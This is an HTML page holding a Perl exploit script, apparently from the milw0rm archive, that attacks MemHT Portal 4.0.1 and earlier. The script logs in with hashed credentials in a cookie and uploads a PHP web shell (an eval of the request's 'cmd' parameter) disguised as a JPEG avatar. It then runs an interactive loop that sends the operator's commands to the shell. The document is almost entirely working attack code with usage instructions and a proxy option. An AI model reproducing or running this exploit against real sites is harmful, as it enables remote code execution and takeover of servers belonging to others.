<html><head><title>MemHT Portal <= 4.0.1 (avatar) Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl 
# MemHT Portal &lt;= 4.0.1 (avatar) Remote Code Execution Exploit
# by yeat - staker[at]hotmail[dot]it

use Getopt::Std;
use Digest::MD5('md5_hex');
use LWP::UserAgent;


getopts('p:',\my %opts);

my ($host,$file,$id,$username,$password) = @ARGV;

my $http = new LWP::UserAgent;
my $u_agent = &quot;Lynx (textmode)&quot;;
my $cookies = &quot;login_user=$id#&quot;.md5_hex($username).&quot;#&quot;.md5_hex($password);


Main::RunExploit();


# Main Package

package Main;


sub Usage {

return print &lt;&lt;EOF;
+--------------------------------------------------------------+
| MemHT Portal &lt;= 4.0.1 (avatar) Remote Code Execution Exploit |
+--------------------------------------------------------------+
by yeat - staker[at]hotmail[dot]it

Usage: perl xpl.pl host/path file id user pass [OPTIONS]
host: target host and memht path
file: file to upload
user: valid username
pass: valid password
id: user id

Options:

-p [specify a proxy] [server]:[port]

Example: 
perl xpl.pl localhost/memht yeat.php 38 MrJack obscure 
perl xpl.pl localhost/memht yeat.php 38 MrJack obscure -p 213.151.89.109:80

EOF

}


sub RunExploit 
{    
    if (defined $opts{p}) {
        HTTP::Proxy($opts{p});
    }
    
    if (@ARGV &lt; 5 || @ARGV &gt; 7) {
        Main::Usage();
    }
    else { 
        HTTP::UserAgent($u_agent);
        MemHT::Login();     
        MemHT::Exploit($file);
    }    
}




# MemHT Exploit Package

package MemHT;

sub Exploit 
{
    my $resp;
    my $file = shift(@_);
    my $path = &quot;/index.php?page=users&amp;op=editProfile&quot;;

    my $data = {
        chg_email =&gt; 'yeat@doesntexist.net',
        avatar    =&gt; [
                      undef,
                      $file,
                      Content_Type =&gt; 'image/jpeg',
                      Content      =&gt; '&lt;?php error_reporting(E_ALL); eval($_REQUEST[\'cmd\']); ?&gt;',
                      # Content =&gt; 'Here you can write everything :) this is an example!',
                     ],
        chg       =&gt; 'true',
        Submit    =&gt; 'Modify',
    };  
    
    my $send = $http-&gt;post('http://'.$host.$path,
                           $data,
                           Content_Type =&gt; 'multipart/form-data',
                          );
    
    if ($send-&gt;as_string =~ m{logout}i) {
        print &quot;File Uploaded! / $host/images/avatar/uploaded/$file\n\n&quot;;
        
        while (1) {
           print &quot;\n[yeat-PHPshell]:~# &quot;;
           chomp(my $content = &lt;STDIN&gt;);
           $resp = HTTP::GET(&quot;$host/images/avatar/uploaded/$file?cmd=$content&quot;);
           print $resp-&gt;content;
        }                         
    }
    else {
        print &quot;Exploit Failed!\n&quot;;
        exit;
    }     
}   
           

sub Login
{
    HTTP::Cookies($cookies);
    my $response = HTTP::GET($host.'/index.php?page=pvtmsg&amp;op=newMessage');
    
    if ($response-&gt;content =~ /access denied/i) {
        print &quot;Login Failed!\n&quot;;
        exit;
    }
}           
           
                                 

# HTTP Package

package HTTP;


sub Cookies 
{
    return $http-&gt;default_header('Cookie' =&gt; $_[0]);
}

sub UserAgent 
{
    return $http-&gt;agent($_[0]);
}    

sub GET 
{    
    if ($_[0] !~ m{^http://(.+?)$}i) {
        return $http-&gt;get('http://'.$_[0]);
    }    
    else {
        return $http-&gt;get($_[0]);
    }    
}
    
sub POST 
{   
    if ($_[0] !~ m{^http://(.+?)$}i) {
        return $http-&gt;post('http://'.$_[0]);
    }    
    else {
        return $http-&gt;post($_[0]);
    }    
}
    
sub http_header 
{
    return $http-&gt;default_header($_[0]);
}            
    
sub Proxy 
{
    return $http-&gt;proxy('http', 'http://'.$_[0]);   
}   

# milw0rm.com [2009-01-25]</pre></html>